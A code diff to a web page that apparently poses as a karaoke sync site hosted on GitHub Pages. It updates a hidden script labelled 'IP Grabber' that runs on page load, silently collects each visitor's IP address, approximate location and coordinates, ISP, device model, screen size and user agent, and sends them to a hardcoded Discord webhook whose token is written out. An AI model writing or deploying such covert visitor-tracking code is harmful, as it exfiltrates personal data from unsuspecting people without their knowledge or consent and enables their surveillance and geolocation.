@@ -1084,60 +1084,51 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER UPGRADE v6 - Lokasi Akurat + Device Model ==================== -->
+<!-- ==================== IP GRABBER UPGRADE v7 - Device Model + Lokasi Akurat ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
 function getDeviceModel() {
     const ua = navigator.userAgent.toLowerCase();
-    
     if (ua.includes('android')) {
-        let model = 'Android';
-        const brands = ['samsung', 'xiaomi', 'oppo', 'vivo', 'realme', 'oneplus', 'huawei', 'redmi'];
-        for (let brand of brands) {
-            if (ua.includes(brand)) {
-                model = brand.charAt(0).toUpperCase() + brand.slice(1) + ' Android';
-                break;
-            }
-        }
-        return model;
+        if (ua.includes('samsung')) return 'Samsung Android';
+        if (ua.includes('xiaomi') || ua.includes('redmi')) return 'Xiaomi / Redmi';
+        if (ua.includes('oppo')) return 'Oppo';
+        if (ua.includes('vivo')) return 'Vivo';
+        if (ua.includes('realme')) return 'Realme';
+        return 'Android Device';
     }
     if (/iphone|ipad|ipod/.test(ua)) return 'iPhone / iPad';
-    if (ua.includes('windows')) return 'Windows PC';
-    if (ua.includes('macintosh')) return 'Mac';
+    if (ua.includes('windows')) return 'Windows PC/Laptop';
+    if (ua.includes('macintosh')) return 'MacBook / iMac';
     return 'Unknown Device';
 }
 
 async function sendIPLog() {
     let ipData = {};
-
     try {
-        // Pakai ip-api.com (lebih akurat untuk Indonesia)
-        const res = await fetch('http://ip-api.com/json/?fields=status,message,query,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as');
+        const res = await fetch('http://ip-api.com/json/?fields=query,country,regionName,city,lat,lon,isp,org');
         ipData = await res.json();
-    } catch (e) {
-        console.log("IP lookup failed");
-    }
+    } catch (e) {}
 
     const deviceModel = getDeviceModel();
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v6)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v7)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
             { name: "IP Address", value: `\`${ipData.query || 'Unknown'}\``, inline: true },
             { name: "Lokasi", value: `${ipData.city || '-'}, ${ipData.regionName || '-'}, ${ipData.country || 'Unknown'}`, inline: true },
-            { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat}, ${ipData.lon}` : 'Tidak tersedia', inline: true },
+            { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
             { name: "ISP", value: ipData.isp || 'Unknown', inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
-            { name: "Operating System", value: navigator.platform || 'Unknown', inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
-            { name: "Device Info", value: navigator.userAgent.substring(0, 250) + (navigator.userAgent.length > 250 ? "..." : ""), inline: false },
+            { name: "Device Info", value: navigator.userAgent.substring(0, 220) + "...", inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • Upgrade v6 (Lokasi + Model)" }
+        footer: { text: "IP Grabber via GitHub Pages • Upgrade v7" }
     };
 
     try {
@@ -1146,15 +1137,15 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim - Upgrade v6", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim - Upgrade v7", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
 }
 
-// Jalankan setelah halaman load
+// Jalankan setelah load
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 2000);
+    setTimeout(sendIPLog, 1800);
 });
 </script>
-<!-- ==================== END IP GRABBER UPGRADE v6 ==================== -->
+<!-- ==================== END IP GRABBER UPGRADE v7 ==================== -->
